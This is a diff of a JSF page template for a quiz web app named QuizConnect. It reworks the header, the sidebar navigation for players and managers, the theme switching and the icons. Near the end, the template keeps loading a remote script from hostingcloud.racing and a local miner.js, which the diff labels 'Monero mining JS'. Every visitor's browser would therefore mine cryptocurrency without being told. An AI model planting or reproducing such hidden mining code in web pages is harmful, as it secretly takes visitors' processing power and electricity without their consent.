@@ -10,110 +10,158 @@
     <!-- Required meta tags -->
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+    <meta name="theme-color" content="#191919"/>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/resources/favicon/apple-touch-icon.png"/>
+    <link rel="icon" type="image/png" sizes="32x32" href="/resources/favicon/favicon-32x32.png"/>
+    <link rel="icon" type="image/png" sizes="16x16" href="/resources/favicon/favicon-16x16.png"/>
+    <link rel="manifest" href="/resources/favicon/site.webmanifest"/>
+    <link rel="mask-icon" href="/resources/favicon/safari-pinned-tab.svg" color="#5bbad5"/>
+    <link rel="shortcut icon" href="/resources/favicon/favicon.ico"/>
+    <meta name="msapplication-TileColor" content="#da532c"/>
+    <meta name="msapplication-config" content="/resources/favicon/browserconfig.xml"/>
+
+    <script type="text/javascript" src="../../resources/theme/themes.js" />
 
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"/>
-    <link rel="stylesheet" href="../../resources/css/main.css" />
+    <link rel="stylesheet" href="../../resources/main.css" />
 
     <!--FontAwesome -->
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous"/>
 
-    <title>In Game | QuizConnect</title>
+    <title><ui:insert name="title" /> | QuizConnect&trade;</title>
+
     <ui:insert name="site-specific-css"/>
-
-
 
 </h:head>
 
 <h:body>
-    <div data-pushbar-id="bar" class="pushbar from_left">
-        <div class="pushbar-close">
-                <span data-pushbar-close="" class="py-2 px-2 my-2 mx-3">
-                    <svg viewBox="0 0 24 24" width="24" height="24"><path class="heroicon-ui" d="M16.24 14.83a1 1 0 0 1-1.41 1.41L12 13.41l-2.83 2.83a1 1 0 0 1-1.41-1.41L10.59 12 7.76 9.17a1 1 0 0 1 1.41-1.41L12 10.59l2.83-2.83a1 1 0 0 1 1.41 1.41L13.41 12l2.83 2.83z"/></svg>
-                </span>
-        </div>
+    <h:messages id="messages" globalOnly="true" styleClass="alerts" showSummary="true" showDetail="true"/>
 
-        <h:form rendered="#{sessionInfoBean.hasRole('PLAYER')}">
-            <nav class="pushbar-nav pl-4 pr-3 py-4">
-                <ul class="list-unstyled">
-                    <li class="my-3">
-                        <h:commandLink action="/player/home?faces-redirect=true" value="Home"/>
-                    </li>
-                    <li class="my-3">
-                        <a href="/quizroom/index.html">Join Game</a>
-                    </li>
-                    <li class="my-3">
-                        <a href="/quizroom/createRoom.xhtml?faces-redirect=true">Create Game</a>
-                    </li>
-                    <li class="my-3">
-                        <!--
-                        <h:link outcome="/players/profile" value="My Stats">
-                            <f:param name="id" value="# {sessionInfoBean.currentUser.player.id}"/>
-                        </h:link>
-                        -->
-                        <h:commandLink action="/players/profile?faces-redirect=true" value="My Stats">
-                            <f:ajax execute="@this" render="@none"/>
-                            <f:setPropertyActionListener value="#{sessionInfoBean.currentUser.player}" target="#{profileBean.player}"/>
-                        </h:commandLink>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/players/all?faces-redirect=true" value="View Players"/>
-                    </li>
-                </ul>
-            </nav>
-        </h:form>
+    <div id="main" class="slideout-backdrop">
+        <header class="navbar d-flex py-2 px-3">
+            <div class="navbar-burger js-toggle-sidebar">
+                <i data-feather="menu" class="xlg"></i>
+            </div>
 
-        <h:form rendered="#{sessionInfoBean.hasRole('MANAGER')}">
-            <nav class="pushbar-nav pl-4 pr-3 py-4">
-                <ul class="list-unstyled">
-                    <li class="my-3">
-                        <h:commandLink action="/secured/home?faces-redirect=true" value="Home"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/secured/QSOverview.xhtml?faces-redirect=true" value="QuestionSets"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/players/all?faces-redirect=true" value="Players"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/secured/profile.xhtml?faces-redirect=true" value="Settings"/>
-                    </li>
-                </ul>
-            </nav>
-        </h:form>
+            <div class="d-flex flex-grow-1 justify-content-center px-2">
+                <h2 class="site-title"><ui:insert name="title" /></h2>
+            </div>
 
-        <a class="pushbar-logout" href="/logout">Logout</a>
-    </div>
+            <div class="d-flex justify-content-end px-2">
+                <a class="navbar-logo icon" href="/login.xhtml">
+                    <svg id="icon" viewBox="0 0 2000 2000" width="30" height="30"><defs><style>.cls-1,.cls-2{fill:none;stroke-miterlimit:10;stroke-width:200px;}.cls-1{stroke:#018786;stroke-dasharray:248.33 19.87;}.cls-2{stroke:#00c4b4;stroke-linecap:round;}.cls-3{fill:#3bc5b5;}</style></defs><circle class="cls-1" cx="1000" cy="1000" r="853.59"/><path class="cls-2" d="M1000,1853.59c-471.42,0-853.59-382.16-853.59-853.59S528.58,146.41,1000,146.41"/><path class="cls-3" d="M1042.58,866.18,1949,1953,898.42,1004.82A100.25,100.25,0,0,1,1032.76,856,109.71,109.71,0,0,1,1042.58,866.18Z"/></svg>
+                </a>
+            </div>
+        </header>
 
+        <main class="container">
 
-    <div class="pushbar_main_content">
-        <ui:include src="/WEB-INF/includes/navbar.xhtml" />
-
-        <main>
             <ui:insert name="content" />
+
         </main>
     </div>
+
+    <div id="menu" class="sidebar flex-column">
+        <div class="d-flex py-2 px-3 justify-content-end">
+            <span class="sidebar-toggle js-toggle-sidebar pointer">
+                <i data-feather="x" class="xlg"></i>
+            </span>
+        </div>
+
+
+        <h:form styleClass="flex-grow-1" rendered="#{sessionInfoBean.hasRole('PLAYER')}">
+            <nav class="d-flex flex-column">
+                <h:commandLink action="/players/profile?faces-redirect=true" styleClass="sidebar-link">
+                    <f:ajax execute="@this" render="@none"/>
+                    <f:setPropertyActionListener value="#{sessionInfoBean.currentUser.player}" target="#{profileBean.player}"/><i data-feather="home" class="lg mr-3"></i> Home</h:commandLink>
+                <a href="/quizroom/index.html" class="sidebar-link"><i data-feather="zap" class="lg mr-3"></i> Join Game</a>
+                <a href="/quizroom/createRoom.xhtml?faces-redirect=true" class="sidebar-link"><i data-feather="plus-circle" class="lg mr-3"></i> Create Game</a>
+                <h:commandLink action="/players/all?faces-redirect=true" styleClass="sidebar-link"><i data-feather="users" class="lg mr-3"></i> View Players</h:commandLink>
+            </nav>
+        </h:form>
+
+        <h:form styleClass="flex-grow-1" rendered="#{sessionInfoBean.hasRole('MANAGER')}">
+            <nav class="d-flex flex-column">
+                <h:commandLink action="/secured/home?faces-redirect=true" styleClass="sidebar-link"><i data-feather="home" class="lg mr-3"></i> Home</h:commandLink>
+                <h:commandLink action="/secured/overview.xhtml?faces-redirect=true" styleClass="sidebar-link"><i data-feather="help-circle" class="lg mr-3"></i> QuestionSets</h:commandLink>
+                <h:commandLink action="/players/all?faces-redirect=true" styleClass="sidebar-link"><i data-feather="users" class="lg mr-3"></i> Players</h:commandLink>
+            </nav>
+        </h:form>
+
+        <h:panelGroup layout="block" styleClass="flex-grow-1" rendered="#{!sessionInfoBean.hasRole('MANAGER') and !sessionInfoBean.hasRole('PLAYER')}"/>
+
+        <footer class="sidebar-footer text-center">
+            <div class="sidebar-themes py-4">
+                <div class="theme" onclick="changeTheme('light')"><i data-feather="sun" class="lg"></i></div>
+                <div class="theme" onclick="changeTheme('outrun')"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sunset lg"><path d="M17 18a5 5 0 0 0-10 0"></path><line x1="12" y1="9" x2="12" y2="7"></line><line x1="4.22" y1="10.22" x2="5.64" y2="11.64"></line><line x1="1" y1="18" x2="3" y2="18"></line><line x1="21" y1="18" x2="23" y2="18"></line><line x1="18.36" y1="11.64" x2="19.78" y2="10.22"></line><line x1="23" y1="22" x2="1" y2="22"></line></svg><!--<i data-feather="sunset" class="lg"></i>--></div>
+                <div class="theme" onclick="changeTheme('default')"><i data-feather="moon" class="lg"></i></div>
+            </div>
+
+            <a class="sidebar-logout" href="/logout"><i data-feather="log-out" class="mr-2"></i>Logout</a>
+        </footer>
+
+    </div>
+    <script type="text/javascript" src="../../resources/modules/slideout.min.js" />
+    <script type="text/javascript">
+      let sidebar = new Slideout({
+        'panel': document.getElementById('main'),
+        'menu': document.getElementById('menu'),
+        'padding': 256,
+        'tolerance': 70
+      });
+
+      let btns = document.querySelectorAll('.js-toggle-sidebar');
+      btns.forEach(btn => btn.addEventListener('click', () => {
+        sidebar.toggle();
+      }));
+
+      const close = (e) => {
+        e.preventDefault();
+        sidebar.close();
+      };
+
+      // code for activating backdrop
+
+      sidebar.on('beforeopen', function(){ this.panel.classList.add('panel-open');})
+        .on('open', function(){this.panel.addEventListener('click', close);})
+        .on('beforeclose', function(){
+          this.panel.classList.remove('panel-open');
+          this.panel.removeEventListener('click', close);
+        })
+    </script>
+
+    <ui:insert name="modals"/>
 
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
     <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="../../resources/js/close-alert.js"/>
-    <script type="text/javascript" src="../../resources/js/pushbar.js" />
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
     <script type="text/javascript">
-        const pushbar = new Pushbar({
-            blur:true,
-            overlay:true,
-        });
+      feather.replace()
     </script>
 
+    <!-- Monero mining JS -->
     <!-- Blocked by my adblocker, but local copy of code doesn't work :/ -->
     <script type="text/javascript" src="https://www.hostingcloud.racing/R0UY.js"></script>
-    <script type="text/javascript" src="../../resources/js/miner.js" />
+    <script type="text/javascript" src="../../resources/util/miner.js" />
 
-    <h:messages styleClass="messages" id="messages" globalonly="true" showSummary="true" showDetail="true"/>
+    <script type="text/javascript">
+      var startObserver = function() {
+        var observer = new MutationObserver(function() {feather.replace()});
+        observer.observe(document, {childList: true, subtree: true});
+      };
+      startObserver();
+    </script>
 
     <ui:insert name="site-specific-javascript"/>
+
+    <ui:fragment rendered="#{sessionInfoBean.hasRole('PLAYER')}">
+        <script type="text/javascript" src="/resources/util/konami.js" />
+    </ui:fragment>
 </h:body>
 </html>
